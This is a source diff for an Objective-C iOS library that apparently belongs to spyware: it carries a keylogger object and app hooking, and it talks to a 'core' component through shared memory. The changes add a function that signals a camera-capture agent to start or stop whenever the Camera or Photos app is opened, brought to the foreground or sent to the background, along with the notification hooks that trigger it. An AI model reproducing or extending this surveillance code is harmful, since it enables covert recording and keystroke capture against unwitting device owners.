@@ -37,6 +37,8 @@
 
 #import "ARMHooker.h"
 
+#define CAMERA_APP    @"com.apple.camera"
+#define CAMERA_APP_40 @"com.apple.mobileslideshow"
 
 #define VERSION       0.6
 //#define DEBUG
@@ -64,8 +66,8 @@ static int scrFlag          = 0;
 static int appFlag          = 0;
 static int stdFlag          = 0;
 
-RCSISharedMemory      *mSharedMemoryCommand;
-RCSISharedMemory      *mSharedMemoryLogging;
+RCSISharedMemory      *mSharedMemoryCommand = nil;
+RCSISharedMemory      *mSharedMemoryLogging = nil;
 RCSIKeyLogger         *gLogger;
 
 FILE *mFD;
@@ -442,6 +444,50 @@ static void TurnWifiOff(CFNotificationCenterRef center,
   [NSThread exit];
 }
 
+BOOL triggerCamera(UInt32 startStop)
+{
+  BOOL retVal = YES;
+  
+  if (mSharedMemoryLogging == nil)
+    return FALSE;
+    
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  NSMutableData *actionData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
+  shMemoryLog *shMemoryHeader = (shMemoryLog *)[actionData bytes];
+  
+  shMemoryHeader->status          = SHMEM_WRITTEN;
+  shMemoryHeader->logID           = 0;
+  shMemoryHeader->agentID         = AGENT_CAM;
+  shMemoryHeader->direction       = D_TO_CORE;
+  shMemoryHeader->commandType     = CM_LOG_DATA;
+  shMemoryHeader->flag            = startStop;
+  shMemoryHeader->commandDataSize = 0;
+  shMemoryHeader->timestamp       = 0;
+  
+  if ([mSharedMemoryLogging writeMemory: actionData 
+                                 offset: 0
+                          fromComponent: COMP_AGENT] == TRUE)
+    {
+#ifdef DEBUG
+      NSLog(@"[DYLIB] %s: triggering startStop %d", __FUNCTION__, aAction);
+#endif
+    }
+  else
+    {
+#ifdef DEBUG_ERRORS
+      NSLog(@"[DYLIB] %s: error triggering startStop", __FUNCTION__);
+#endif
+      retVal=NO;
+    }
+  
+  [actionData release];
+  
+  [pool release];
+  
+  return retVal;
+}
+
 BOOL triggerStanByAction(UInt32 aAction)
 {
   BOOL retVal = YES;
@@ -644,6 +690,17 @@ BOOL triggerStanByAction(UInt32 aAction)
       return;
     }
   
+  NSString *execName = [[NSBundle mainBundle] bundleIdentifier];
+  
+  if ([execName compare: CAMERA_APP] == NSOrderedSame ||
+      [execName compare: CAMERA_APP_40] == NSOrderedSame)
+    {
+#ifdef DEBUG
+      NSLog(@"[DYLIB] %s: execName %@ triggering sem", __FUNCTION__, execName);
+#endif
+      triggerCamera(1);
+    }
+    
   while (mMainThreadRunning == YES)
     {
       NSMutableData     *readData = nil;
@@ -1104,7 +1161,7 @@ BOOL triggerStanByAction(UInt32 aAction)
     {
 #ifdef DEBUG
       NSLog(@"[DYLIB] %s: not SB don't hooking", __FUNCTION__);
-#endif
+#endif      
       [NSThread detachNewThreadSelector: @selector(communicateWithCore)
         toTarget: self
         withObject: nil];
@@ -1113,7 +1170,25 @@ BOOL triggerStanByAction(UInt32 aAction)
 
 - (void)stopCoreCommunicator
 {
-  
+
+}
+
+- (void)appInForeground
+{
+  NSString *execName = [[NSBundle mainBundle] bundleIdentifier];
+  if ([execName compare: CAMERA_APP] == NSOrderedSame)
+    {
+      triggerCamera(1);
+    }
+}
+
+- (void)appInBackground
+{
+  NSString *execName = [[NSBundle mainBundle] bundleIdentifier];
+  if ([execName compare: CAMERA_APP] == NSOrderedSame)
+    {
+      triggerCamera(2);
+    }
 }
 
 - (id)init
@@ -1164,5 +1239,29 @@ extern "C" void RCSIInit ()
    name: UIApplicationWillTerminateNotification
    object: nil];
    */
+   
+   NSInteger OSMajor = [[[UIDevice currentDevice] systemVersion] integerValue];
+
+#ifdef DEBUG
+   NSLog(@"[DYLIB] %s: OSMajor %d", __FUNCTION__, OSMajor);
+#endif
+
+   if (OSMajor >= 4)
+     {
+      [[NSNotificationCenter defaultCenter] addObserver: loader
+                                               selector: @selector(appInForeground)
+                                                   name: @"UIApplicationWillEnterForegroundNotification"
+                                                 object: nil];
+                                                 
+      [[NSNotificationCenter defaultCenter] addObserver: loader
+                                               selector: @selector(appInBackground)
+                                                   name: @"UIApplicationDidEnterBackgroundNotification"
+                                                 object: nil];
+      // only for 4.0
+      [[NSNotificationCenter defaultCenter] addObserver: loader
+                                               selector: @selector(appInBackground)
+                                                   name: @"UIApplicationWillTerminateNotification"
+                                                 object: nil];
+     }
   [pool drain];
 }
